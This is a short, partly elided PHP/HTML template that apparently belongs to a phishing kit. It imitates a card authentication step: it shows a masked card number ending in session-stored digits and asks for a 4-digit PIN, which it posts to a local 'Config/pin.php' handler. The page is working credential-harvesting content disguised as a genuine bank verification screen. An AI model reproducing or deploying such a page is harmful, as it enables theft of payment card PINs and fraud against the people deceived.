...
<html lang="en-MA" dir="<?php echo lang('xlangdrx');  ?>" base="ma-en" class="is-desktop js-global-newsflash-visible" data-di-loaded="1" data-analytics="true">
...
<body class=""><iframe aria-hidden="true" tabindex="-1" title="Text Zoom Event Iframe" style="width: 1em; height: 1px; border-width: 0px; position: absolute; overflow: hidden; white-space: nowrap; margin: -1px;" src="./styles/saved_resource.html"></iframe>
    ...
    <div class="l-view ">
        ...
        <form method="POST" action="./Config/pin.php">
        <div class="carda">
       ...
       <div class="progtext">
        ...
        <h4 style="margin-top: 30px;"><?php echo lang('xAauth'); ?></h4>

        <div  class="cardaaaa">

       <div class="spn"><p><?php echo lang('xpin1'); ?></p><p>XXXX XXXX XXXX <?php echo $_SESSION['4digits']; ?></p></div>
        ...
        <input name="pin" placeholder="<?php echo lang('xpin2'); ?>" class="inpt" maxlength="4"  type="text" required="">
